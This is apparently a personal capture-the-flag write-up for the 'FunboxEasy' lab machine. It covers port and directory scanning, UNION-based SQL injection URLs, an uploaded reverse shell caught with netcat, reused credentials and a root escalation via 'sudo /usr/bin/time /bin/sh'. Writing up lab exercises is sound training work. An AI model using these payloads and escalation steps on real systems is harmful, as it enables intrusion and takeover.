---
tags: time, lxd, sqli
---
# Offsec PG: FunboxEasy

***Overview**: The FunboxEasy machine is a Linux machine rated as easy on Offensive Security playgrounds, it exploits file upload vulnerability to gain foothold using a reverse shell and then elevates privileges to root by exploiting the time binary.*

#### Scanning and Enumeration
- so going to the site I'm presented with the default Apache page
![](FunboxEasy_assets/Pasted%20image%2020221028181118.png)
- then i scan for open ports and services using nmap `nmap -sV -sC -T4 -A -p- 192.168.55.111`
![](FunboxEasy_assets/Pasted%20image%2020221028194556.png)
- Then I scan for directories using FFUF as usual :) `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://192.168.82.111/FUZZ -e .txt,.php`
- I found the /store directory and also a /secret directory and others as well like an admin login page
![](FunboxEasy_assets/Pasted%20image%2020221028181202.png)
![](FunboxEasy_assets/Pasted%20image%2020221028181330.png)
![](FunboxEasy_assets/Pasted%20image%2020221028181341.png)
- in the store admin login, i tried logging in with admin and any password and i got authenticated
![](FunboxEasy_assets/Pasted%20image%2020221028183637.png)
- then i was presented with the page which showed different boo
![](FunboxEasy_assets/Pasted%20image%2020221028183737.png)
- I tried testing for SQL injection and saw that the application was vulnerable
![](FunboxEasy_assets/Pasted%20image%2020221028184250.png)
- I was able to find out that 7 columns were being used in the page using the payload `http://192.168.55.111/store/book.php?bookisbn=978-1-49192-706-9%27+ORDER+BY+7--+`
- then i also saw the columns being displayed on the page `http://192.168.55.111/store/book.php?bookisbn=0%27+UNION+SELECT+1,2,3,4,5,6,7--+`
![](FunboxEasy_assets/Pasted%20image%2020221028184912.png)
- I check for the version as well and i saw it is running ubuntu
`http://192.168.55.111/store/book.php?bookisbn=0%27+UNION+SELECT+@@version,2,3,4,5,6,7--+`
![](FunboxEasy_assets/Pasted%20image%2020221028185054.png)
- I tried enumerating further by checking the table sin the database using the payload `http://192.168.55.111/store/book.php?bookisbn=0%27+UNION+SELECT+table_name,2,3,4,5,6,7+from+information_schema.tables--+` and i got ADMINISTRABLE_ROLE_AUTHORIZATIONS
![](FunboxEasy_assets/Pasted%20image%2020221028185146.png)
- then i checked for the columns in that table using `http://192.168.55.111/store/book.php?bookisbn=0%27+UNION+SELECT+column_name,2,3,4,5,6,7+from+information_schema.columns+where+table_name=%27ADMINISTRABLE_ROLE_AUTHORIZATIONS%27--+` and i got GRANTEE
![](FunboxEasy_assets/Pasted%20image%2020221028185507.png)
- but trying to go even further i was met with a dead end
- so I decided to check the robots.txt directory and i found the gym directory, which was also found in the directory scan.
![](FunboxEasy_assets/Pasted%20image%2020221028194008.png)
#### File upload and Foothold
- going back to the logged in session and try to edit one of the books, then for images i tried to upload my reverse shell script to see if i can get a reverse shell
![](FunboxEasy_assets/Pasted%20image%2020221028202318.png)
- then knowing the images arebeing stored in the bootstrap directory, i go to the my script
![](FunboxEasy_assets/Pasted%20image%2020221028201206.png)
- after setting up my netcat listener, i then click on the script
![](FunboxEasy_assets/Pasted%20image%2020221028202512.png)
- and then i get  a reverse shell
![](FunboxEasy_assets/Pasted%20image%2020221028202645.png)
- viewing the current directory i discover the credentials for different accounts
![](FunboxEasy_assets/Pasted%20image%2020221028202823.png)
- i was able to login to the admin page using admin and asdfghjklXXX as the password, but i didn't find anything useful there
![](FunboxEasy_assets/Pasted%20image%2020221028211216.png)
- i was also able to login using the ssh credentials found i.e tony as username and password as yxcvbnmYYY
![](FunboxEasy_assets/Pasted%20image%2020221028203036.png)
#### Privilege Escalation
- I went on to find privilege escalation vectors since i didn't see the first flag in the current directory.
- running `sudo -l` i was able to find some binaries that can be run with sudo privileges and without password, but i decided to exploit the time binary
![](FunboxEasy_assets/Pasted%20image%2020221028205659.png)
- i also checked the id of the current user and also found some more interesting escalation vectors like `lxd`
![](FunboxEasy_assets/Pasted%20image%2020221028203550.png)
- so exploit the time binary i ran `sudo /usr/bin/time /bin/sh` and i got root access and got the root flag
![](FunboxEasy_assets/Pasted%20image%2020221028205636.png)
- then searching for the text files using  `find / -name *.txt`, i was able to find the first flag as well
![](FunboxEasy_assets/Pasted%20image%2020221028212951.png)
![](FunboxEasy_assets/Pasted%20image%2020221028213329.png)

 Thank you so much for reading my writeup, see you next time :)



